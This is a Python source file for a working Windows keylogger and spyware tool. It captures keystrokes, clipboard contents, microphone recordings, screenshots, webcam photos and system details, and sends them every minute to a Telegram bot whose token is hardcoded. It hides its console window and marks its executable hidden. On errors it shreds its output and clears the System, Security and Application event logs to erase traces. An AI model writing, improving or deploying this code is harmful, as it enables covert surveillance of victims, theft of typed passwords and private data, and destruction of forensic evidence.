import telegram
from telegram.error import TelegramError
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
import wave
import sounddevice as sd
from cryptography.fernet import Fernet
from requests import get
from cv2 import VideoCapture, imshow, imwrite, destroyWindow, waitKey
from PIL import ImageGrab
import logging
import signal
import traceback
from typing import Optional
import win32gui
import win32con
import sys
import win32process
import ctypes

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('keylogger.log'),
        logging.StreamHandler()
    ]
)

# Global Variables
keys_info = "key_log.txt"
system_info = "syseminfo.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
webCamShot_info = "webCamera.png"

keys_info_e = "e_key_log.txt"
system_info_e = "e_systeminfo.txt"
clipboard_info_e = "e_clipboard.txt"

microphone_time = 20  # Changed from 10 to 20 seconds
time_iteration = 60  # Send data every 1 minute

delete_files = [system_info, clipboard_info, keys_info, screenshot_info, audio_info]

# Telegram Configuration
telegram_token = "7484776501:AAFXRvduMzYq8-qOLReipATAiffGEWM_xrw"  # Replace with your bot token
telegram_chat_id = "862813205"  # Replace with your chat ID
bot = telegram.Bot(token=telegram_token)

file_path = "Files"  # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

# Generate encryption key
encryption_key = Fernet.generate_key()
fernet = Fernet(encryption_key)

class KeyloggerException(Exception):
    """Base exception for keylogger errors"""
    pass

class ConfigError(KeyloggerException):
    """Configuration related errors"""
    pass

class ResourceError(KeyloggerException):
    """Resource handling errors"""
    pass

def retry_operation(func, max_attempts=3, delay=1):
    """Retry an operation with exponential backoff"""
    for attempt in range(max_attempts):
        try:
            return func()
        except Exception as e:
            if attempt == max_attempts - 1:
                raise
            logging.warning(f"Attempt {attempt + 1} failed: {str(e)}")
            time.sleep(delay * (2 ** attempt))

class ResourceManager:
    """Manage cleanup of resources"""
    def __init__(self):
        self.resources = []
        
    def add(self, resource, cleanup_func):
        self.resources.append((resource, cleanup_func))
        
    def cleanup(self):
        errors = []
        for resource, cleanup_func in reversed(self.resources):
            try:
                cleanup_func(resource)
            except Exception as e:
                errors.append(str(e))
        if errors:
            raise ResourceError(f"Cleanup errors: {'; '.join(errors)}")

# Validate configuration
def validate_config():
    if not telegram_token or not telegram_chat_id:
        raise ConfigError("Telegram configuration is missing")
    if not file_path:
        raise ConfigError("File path is not set")
    try:
        bot = telegram.Bot(token=telegram_token)
        bot.get_me()  # Test the connection
    except TelegramError as e:
        raise ConfigError(f"Invalid Telegram configuration: {str(e)}")

def check_and_create_files():
    required_files = [
        keys_info, system_info, clipboard_info, 
        audio_info, screenshot_info, webCamShot_info,
        keys_info_e, system_info_e, clipboard_info_e
    ]
    
    try:
        # Create directory if it doesn't exist
        os.makedirs(file_path, exist_ok=True)
        
        # Check and create each file
        for file in required_files:
            file_full_path = os.path.join(file_path, file)
            if not os.path.exists(file_full_path):
                try:
                    # Create file based on extension
                    if file.endswith(('.txt', '.log')):
                        with open(file_full_path, 'w') as f:
                            f.write('')
                    elif file.endswith('.png'):
                        from PIL import Image
                        img = Image.new('RGB', (1, 1), color='black')
                        img.save(file_full_path)
                    elif file.endswith('.wav'):
                        with wave.open(file_full_path, 'w') as f:
                            f.setnchannels(2)
                            f.setsampwidth(2)
                            f.setframerate(44100)
                    logging.info(f"Created: {file}")
                except Exception as e:
                    logging.error(f"Error creating {file}: {str(e)}")
                    raise ResourceError(f"Error creating {file}: {str(e)}")
    except Exception as e:
        logging.error(f"Failed to initialize files: {str(e)}")
        raise ResourceError(f"Failed to initialize files: {str(e)}")

check_and_create_files()

# Send via Telegram
def send_telegram(filename, filepath):
    try:
        with open(filepath, 'rb') as f:
            bot.send_document(chat_id=telegram_chat_id, document=f, filename=filename)
        logging.info(f"Successfully sent {filename}")
    except TelegramError as e:
        logging.error(f"Failed to send {filename}: {str(e)}")
        raise

# Get System Information
def system_information():
    with open(os.path.join(file_merge, system_info), "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (May be due to max query) \n")

        f.write("Processor Info: " + (platform.processor()) + '\n')
        f.write("System Info: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

system_information()

# Copy Clipboard Data
def copy_clipboard():
    with open(os.path.join(file_merge, clipboard_info), "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data : \n" + pasted_data + '\n')
        except:
            f.write("Clipboard Could not be copied. \n")

copy_clipboard()

# Get Microphone Recordings
def microphone():
    try:
        fs = 44100
        seconds = microphone_time
        
        # Test if audio device is available
        devices = sd.query_devices()
        if not any(device['max_input_channels'] > 0 for device in devices):
            logging.warning("No input audio device found")
            return

        myrecording = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
        sd.wait()
        
        # Save using wave instead of scipy
        with wave.open(os.path.join(file_merge, audio_info), 'wb') as wf:
            wf.setnchannels(2)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes(myrecording.tobytes())
        
        logging.info("Audio recording completed successfully")
    except Exception as e:
        logging.error(f"Failed to record audio: {str(e)}")
        # Create empty audio file
        with wave.open(os.path.join(file_merge, audio_info), 'w') as f:
            f.setnchannels(2)
            f.setsampwidth(2)
            f.setframerate(44100)

microphone()

# Get Screenshots
def screenshots():
    im = ImageGrab.grab()
    im.save(os.path.join(file_merge, screenshot_info))

screenshots()

# Get Snap with WebCamera
def webCamera():
    cam = None
    try:
        cam = VideoCapture(0)
        result, image = cam.read()
        if result:
            imshow("webCam", image)
            imwrite(os.path.join(file_merge, webCamShot_info), image)
            waitKey(1)
            destroyWindow("webCam")
    except Exception as e:
        logging.error(f"Webcam error: {str(e)}")
    finally:
        if cam is not None:
            cam.release()

webCamera()

# Keylogger functions
keys = []
count = 0

def timestamp():
    """Get current timestamp string"""
    return time.strftime("%Y-%m-%d %H:%M:%S")

def on_press(key):
    global keys, count, currentTime
    print(key)
    keys.append(key)
    count += 1
    currentTime = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys.clear()

def write_file(keys):
    with open(os.path.join(file_merge, keys_info), "a") as f:
        f.write(f"\n[{timestamp()}]\n")
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False
    if currentTime > stoppingTime:
        return False

# Add signal handler
def signal_handler(signum, frame):
    global signal_shutdown
    logging.info("Shutdown signal received")
    signal_shutdown = True

def setup_signal_handlers():
    """Setup all signal handlers"""
    # Windows only supports SIGINT and SIGTERM
    signals = (signal.SIGTERM, signal.SIGINT)
    for sig in signals:
        try:
            signal.signal(sig, signal_handler)
        except Exception as e:
            logging.warning(f"Failed to set handler for signal {sig}: {str(e)}")

def check_stop_signal():
    """Check if stop signal file exists"""
    stop_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'stop.signal')
    if os.path.exists(stop_file):
        try:
            os.remove(stop_file)  # Clean up stop file
            return True
        except:
            pass
    return False

# Emergency cleanup function
def emergency_cleanup():
    """Emergency cleanup function that runs on critical errors"""
    try:
        # Kill any active recordings
        sd.stop()
        
        # Close any open windows
        destroyWindow("webCam")
        
        # Clean up all files including logs and encrypted versions
        all_files = delete_files + [
            keys_info_e, system_info_e, clipboard_info_e,
            'keylogger.log', webCamShot_info
        ]
        
        for file in all_files:
            try:
                file_path = os.path.join(file_merge, file)
                if os.path.exists(file_path):
                    # Overwrite file content before deletion
                    with open(file_path, 'wb') as f:
                        f.write(os.urandom(1024))  # Overwrite with random data
                    os.remove(file_path)
                    
                # Remove any backup files
                backup_path = file_path + '.bak'
                if os.path.exists(backup_path):
                    os.remove(backup_path)
            except:
                pass
                
        # Clear Windows event logs that might contain program traces
        try:
            os.system('wevtutil cl System')
            os.system('wevtutil cl Security')
            os.system('wevtutil cl Application')
        except:
            pass
            
        # Clear clipboard
        try:
            win32clipboard.OpenClipboard()
            win32clipboard.EmptyClipboard()
            win32clipboard.CloseClipboard()
        except:
            pass
    except:
        pass

# Collect and send all monitored data
def collect_and_send_data():
    """Collect and send all monitored data"""
    try:
        # Update system info
        system_information()
        
        # Get new recordings and screenshots
        microphone()
        screenshots()
        webCamera()
        copy_clipboard()
        
        # Send all files
        files_to_send = [
            (system_info, "System Info"),
            (clipboard_info, "Clipboard Data"),
            (keys_info, "Keylog Data"),
            (screenshot_info, "Screenshot"),
            (webCamShot_info, "Webcam Shot"),
            (audio_info, "Audio Recording")
        ]
        
        for file, desc in files_to_send:
            filepath = os.path.join(file_merge, file)
            if os.path.exists(filepath):
                try:
                    send_telegram(file, filepath)
                    logging.info(f"Sent {desc}")
                except Exception as e:
                    logging.error(f"Failed to send {desc}: {str(e)}")
    except Exception as e:
        logging.error(f"Error in collect_and_send_data: {str(e)}")

# Hide the process
def hide_process():
    """Hide the process from task view"""
    try:
        # Hide console window
        console_window = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(console_window, win32con.SW_HIDE)
        
        # Make process system critical
        system_process = win32process.GetCurrentProcess()
        win32process.SetPriorityClass(system_process, win32process.NORMAL_PRIORITY_CLASS)
        
        # Hide from task manager
        ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 2)
    except:
        pass

# Timer for KeyLogger
def main():
    resource_manager = ResourceManager()
    cleanup_timeout = 30  # seconds
    try:
        hide_process()  # Add this line at the start of main()
        global currentTime, stoppingTime, signal_shutdown
        setup_signal_handlers()
        
        logging.info("Starting continuous keylogger...")
        
        # Validate and initialize
        retry_operation(validate_config)
        retry_operation(check_and_create_files)
        
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration
        signal_shutdown = False
        
        while not signal_shutdown:
            try:
                if check_stop_signal():
                    signal_shutdown = True
                    break

                with Listener(on_press=on_press, on_release=on_release) as listener:
                    resource_manager.add(listener, lambda x: x.stop())
                    listener.join()

                if currentTime > stoppingTime:
                    retry_operation(lambda: collect_and_send_data())
                    currentTime = time.time()
                    stoppingTime = time.time() + time_iteration

            except Exception as e:
                logging.error(f"Loop iteration error: {str(e)}\n{traceback.format_exc()}")
                if isinstance(e, KeyloggerException):
                    raise
                time.sleep(5)  # Brief pause before retrying

    except KeyboardInterrupt:
        logging.info("Keyboard interrupt received")
        signal_shutdown = True
    except Exception as e:
        logging.error(f"Critical error: {str(e)}\n{traceback.format_exc()}")
        emergency_cleanup()
    finally:
        logging.info("Cleaning up resources...")
        try:
            # Set timeout for cleanup
            cleanup_start = time.time()
            while time.time() - cleanup_start < cleanup_timeout:
                try:
                    resource_manager.cleanup()
                    for file in delete_files:
                        file_path = os.path.join(file_merge, file)
                        if os.path.exists(file_path):
                            os.remove(file_path)
                            logging.info(f"Cleaned up {file}")
                    break
                except Exception as e:
                    if time.time() - cleanup_start >= cleanup_timeout:
                        raise
                    time.sleep(1)
        except Exception as e:
            logging.error(f"Cleanup error: {str(e)}\n{traceback.format_exc()}")
            emergency_cleanup()
            raise

if __name__ == "__main__":
    main()

